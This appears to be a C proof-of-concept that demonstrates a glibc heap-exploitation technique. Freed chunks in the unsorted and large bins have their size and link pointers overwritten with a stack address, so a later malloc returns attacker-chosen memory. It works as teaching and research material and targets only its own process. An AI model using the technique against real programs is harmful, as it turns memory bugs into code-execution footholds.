#include<stdio.h>
#include<stdlib.h>
 
int main()
{
    unsigned long *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9, *p10, *p11, *p12;
    unsigned long *p;
    unsigned long stack[8] = {0};
    printf("stack address: %p\n", &stack);
    p1 = malloc(0x3F0);
    p2 = malloc(0x20);
    p3 = malloc(0x400);
    p4 = malloc(0x20);
    p5 = malloc(0x400);
    p6 = malloc(0x20);
    p7 = malloc(0x120);
    p8 = malloc(0x20);
    p9 = malloc(0x140);
    p10 = malloc(0x20);
    p11 = malloc(0x400);
    p12 = malloc(0x20);

    // Adds two small chunks to the unsorted bin 
    free(p7);
    free(p9);

    /* 
    Put p7 and p9 into the small bin
    Split p7 to give it back to malloc.
    Put the rest of p7 into the unsorted bin and make it the last 
    remainder chunk.
    */
    
    p = malloc(0x60);

    // Put three large bin sized chunks into the unsorted bin
    free(p1);
    free(p3); // Victim chunk to overwrite
    free(p5);
 
    p = malloc(0x60);
 
    free(p11);
 
    *(p3-1) = 0x3f1;
    *(p3) = (unsigned long)(&stack);
    *(p3+1) = (unsigned long)(&stack);
    *(p3+2) = (unsigned long)(&stack);
    *(p3+3) = (unsigned long)(&stack);
    // trigger malicious malloc
    p = malloc(0x60);

    printf("P: %p\n", p);  
    for(int i = 0; i < 8; i++){
        printf("Value at stack: %x\n", stack[i]);
    }
    return 0;
}
